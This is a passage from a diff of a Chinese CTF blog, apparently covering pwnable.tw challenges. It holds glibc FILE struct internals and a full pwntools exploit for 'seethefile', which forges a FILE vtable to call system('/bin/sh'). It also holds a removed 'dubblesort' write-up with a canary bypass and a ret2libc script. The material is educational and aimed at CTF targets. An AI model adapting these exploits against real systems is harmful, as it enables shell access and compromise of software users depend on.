*/</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br></pre></td></tr></table></figure></p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure>
 <p>这里伪造结构体的时候有一些关键的点需要注意:  </p>
 <ol>
@@ -1969,193 +2169,6 @@
 </ol>
 <p>综上所述最终的payload结构如下:</p>
 <h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./seethefile'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10200</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">fp_addr = <span class="number">0x0804B280</span></span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'What do you want to see :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line"><span class="comment">##get libc base addr</span></span><br><span class="line">sh.recvline(<span class="number">1</span>)</span><br><span class="line">libc_addr = int(sh.recvuntil(<span class="string">'-'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'libc base addr =&gt; '</span> + hex(libc_addr))</span><br><span class="line"><span class="comment">#shell_addr = libc_addr + 0x5f065</span></span><br><span class="line">shell_addr = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">sh.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">##</span></span><br><span class="line">sh.recvuntil(<span class="string">'Leave your name :'</span>)</span><br><span class="line">vtable_addr = fp_addr+<span class="number">0x94</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x20</span></span><br><span class="line">payload +=  p32(<span class="number">0x0804B284</span>)</span><br><span class="line">payload += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">11</span><span class="comment">#9</span></span><br><span class="line">payload += p32(libc_addr+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>])<span class="comment">#1</span></span><br><span class="line"><span class="comment">#payload += p32(0x0804b284)</span></span><br><span class="line">payload += p32(<span class="number">3</span>)+p32(<span class="number">0</span>)*<span class="number">3</span> + p32(<span class="number">0x0804b260</span>)<span class="comment">#6</span></span><br><span class="line">payload += p32(<span class="number">0xffffffff</span>)*<span class="number">2</span><span class="comment">#3</span></span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">16</span><span class="comment">#14</span></span><br><span class="line">payload += p32(fp_addr+len(payload)+<span class="number">4</span><span class="number">-0x20</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">2</span> + p32(<span class="number">0</span>) * <span class="number">15</span> + p32(shell_addr) + p32(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">sh.sendline(payload) </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/25/dubblesort/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="ama2in9">
-      <meta itemprop="description" content="Talking is cheap, show me the code.">
-      <meta itemprop="image" content="/images/head.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ama2in9">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/25/dubblesort/" itemprop="url">
-                  dubblesort
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-11-25 16:51:59" itemprop="dateCreated datePublished" datetime="2018-11-25T16:51:59+08:00">2018-11-25</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwnable-tw/" itemprop="url" rel="index"><span itemprop="name">pwnable.tw</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/11/25/dubblesort/#comments" itemprop="discussionUrl">
-                
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/11/25/dubblesort/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2018/11/25/dubblesort/" class="leancloud_visitors" data-flag-title="dubblesort">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Views: </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>#<br>pwnable.tw/dubblesort</p>
-<p>##<br>简介</p>
-<p>这是写的第一篇writeup。虽然学了将近一个月pwn，但是还是不得要领，之所以要写这个的writeup，是因为这个很典型，中间用到了绕过canary以及尝试的过程，加上工具的使用，有很强的借鉴意义。</p>
-<p>程序比较简单，放到IDA里F5，得到C代码，默认命名辨识度低，把一些重要变量重命名成易于记忆的名字，main函数里<br><img src="/2018/11/25/dubblesort/1.jpg" alt="first_entry"><br>其中canary的值不能发生变化，首先尝试输入amazing，发现输出的除了名字之后还有一些乱码，这是因为read读取的输入以换行结束，并不包含\x00，而printf输出的结束符为\x00，因此在输出名字之后还会继续向后输出，直到’\0’为止。这里是一个可以泄露栈内容的漏洞<br><img src="/2018/11/25/dubblesort/2.jpg" alt="first_try"><br>继续往下测试，发现这是一个对输入数字进行从小到大排序的程序，问题在于它并没有限制输入数字的数量，这就导致用户输入过长时产生栈溢出，在IDA中可以看到程序内部并没有system函数和’/bin/sh’，因此要从动态链接库里找，即构造ret2libc，gdb调试程序,在puts处下断点，输入4个数字，分别为1，2，3，4，在栈上的输入点为[esp+0x5c]，距离ebp的距离为0x7c,因此栈结构设计如下:<br><img src="/2018/11/25/dubblesort/4.jpg" alt="stack"><br>checksec ./dubblesort可以看到栈开启了各种保护，因为不是直接在栈上布置shellcode所以NX的保护没关系，FULL RELRO表示程序开始的时候会动态加载函数表，不能通过替换got表来执行恶意代码，最重要的是PIE和Canary，IDA里可以看到canary和输入点间的距离是0x60，在gdb中验证之后确实也如此<br><img src="/2018/11/25/dubblesort/5.jpg" alt="checksec"><br><img src="/2018/11/25/dubblesort/6.jpg" alt="canary_position"><br>最后的栈结构如下：<br><img src="/2018/11/25/dubblesort/7.jpg" alt="stack_with_canary"></p>
-<p>##<br>漏洞利用</p>
-<p>###<br>绕过canary</p>
-<p>漏洞还是蛮容易找到的，但是对于我这个菜鸡来说各种保护实在是太难绕过了，脚本也不熟，只能一点点尝试。首先canary上的值不能变，目前遇到的可以绕过canary的方法就是地址任意写，在这里我们要覆盖连续的栈空间，这条路走不通，只能是想方法不写到这块地址上，继续尝试输入，发现输入数字为f等非数字时直接停止之后的输入，直接输入结果，gdb调试发现此时栈上的内容没有发生变化，这是因为以%d格式读取字符时发生格式错误，输入无法写入到栈上，但是没有清空缓存区的函数，这个字符就一直留在缓冲区，之后读取都会发生错误，最终的结果就是这次输入之后的结果都无法写入到栈上，这样我们似乎可以通过输入字符绕过canary，但是此后的输入也无法写到栈上，因此要尝试新的输入，最后尝试到’-‘发现为合法输入，但是不写到栈上，正好满足了我们的需求，因此我们前24个输入填充0，第25位输入’+’绕过保护，再填充比canary值大的数，这是因为之后的排序是从小到大排序，直接对整数指针操作，因此我们要保证canary值位置不变，必须按照递增顺序放置元素，在这里我们使用system函数的地址，因为这个地址大部分时间都大于canary的随机数，一直覆盖到ebp,共7个填充，加上最后覆盖的返回地址共8个system_addr</p>
-<p>###<br>绕过PIE</p>
-<p>绕过PIE的题还没见过，之前学习中讲的是要找到不变的部分，只能gdb慢慢找了。name那里之前提了一个漏洞，可以泄露栈上内容，当然之前说的在输入数字时不改变栈内容也可以泄露内容，但是canary必然会被破坏，因此我们最好利用read泄露地址,查看之后可以看到0xf7fb2000这个值似乎不随输入变化，而且vmmap查看发现这的确是动态链接库的地址,减去起始位置的距离发现偏移量为0x1b0000，使用readelf命令发现这个地址对应的got.plt地址，这样我们就得到了一个固定的got地址，最后，由于printf遇到’\x0’会停止输出，而这个地址最后总为’\0’，因此使用换行符覆盖最后一位，得到的leak地址再减去0x0a即可。<br><img src="/2018/11/25/dubblesort/9.jpg" alt="find addr"><br><img src="/2018/11/25/dubblesort/10.jpg" alt="find_offset"></p>
-<p>##<br>payload.py</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.update(arch=&apos;linux&apos;,os=&apos;i386&apos;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">debug = 0</span><br><span class="line">if debug:</span><br><span class="line">    pc = process(&apos;./dubblesort&apos;)</span><br><span class="line">else:</span><br><span class="line">    pc = remote(&apos;chall.pwnable.tw&apos;, 10101)</span><br><span class="line"></span><br><span class="line">got_off = 0x1b0000</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;a&apos;*24)</span><br><span class="line">got_addr = u32(p.recv()[30:34])-0xa</span><br><span class="line">libc_addr = got_addr-got_off</span><br><span class="line">system_addr = libc_addr + libc.symbols[&apos;system&apos;]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">p.sendline(&apos;35&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(9):</span><br><span class="line">    p.sendline(str(system_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(str(bin_sh_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
           
         
@@ -2245,7 +2258,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-count">13</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2274,7 +2287,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">8</span>
+                      
+                    
+                    <span class="site-state-item-count">9</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
